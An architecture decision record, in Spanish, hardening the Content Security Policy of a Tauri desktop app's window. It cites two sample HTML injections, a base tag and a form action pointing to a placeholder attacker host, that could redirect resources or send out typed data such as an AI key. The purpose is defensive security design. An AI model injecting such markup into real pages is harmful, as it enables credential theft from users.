# ADR 0006 — CSP endurecida de la ventana

- **Fecha:** 2026-09-29
- **Estado:** aceptado
- **Spec:** [F0 — Esqueleto](../specs/2026-09-28-f0-esqueleto.md)

## Contexto

La spec de F0 fijaba la CSP de `tauri-comandos-y-permisos`:

```
default-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src ipc: http://ipc.localhost
```

En la revisión T12, `revisor-seguridad` señaló que `base-uri` y `form-action` **no heredan de `default-src`**: sin declararlas, quedan sin restricción. Una inyección de HTML sin scripts (por ejemplo, contenido de un sitio de WordPress o de un LLM renderizado sin sanear en fases futuras) podría:

- insertar `<base href="https://atacante">` y redirigir las rutas relativas de recursos y enlaces;
- insertar un `<form action="https://atacante">` y enviar fuera lo que el usuario escriba (incluida una clave de IA en un campo).

`object-src` y `frame-src` sí heredan de `default-src 'self'`, pero ningún caso de uso de Faro necesita plugins ni iframes; declararlas en `'none'` hace explícita la intención y evita que una relajación futura de `default-src` los abra sin querer.

## Decisión

1. La CSP de `app.security.csp` en `tauri.conf.json` es exactamente:

   ```
   default-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src ipc: http://ipc.localhost; base-uri 'none'; form-action 'none'; object-src 'none'; frame-src 'none'
   ```

2. La skill `tauri-comandos-y-permisos` recoge esta CSP como la única válida (ya actualizada).
3. `freezePrototype: true` y `withGlobalTauri: false` se mantienen.

## Consecuencias

- Los formularios de la interfaz no pueden enviarse de forma nativa (`form-action 'none'`): todo envío se hace con manejadores de React (`onSubmit` con `preventDefault`) que llaman a comandos del núcleo. Es lo que ya hace F0.
- No se puede usar `<base>`, `<object>`, `<embed>` ni `<iframe>` en la interfaz. Una vista previa de contenido web (por ejemplo, previsualizar un artículo de WordPress) tendrá que renderizarse como HTML saneado o en una ventana aparte con su propia capability y CSP, decidida en su spec.
- **Cualquier relajación futura de la CSP** (añadir orígenes, `'unsafe-eval'`, permitir iframes, formularios o fuentes remotas, etc.) **requiere un ADR nuevo** y revisión de `revisor-seguridad`. Endurecerla más no requiere ADR, pero sí actualizar la skill.
- La verificación manual de F0 (docs/qa, paso 4) comprueba que la consola del webview no muestra violaciones de CSP.
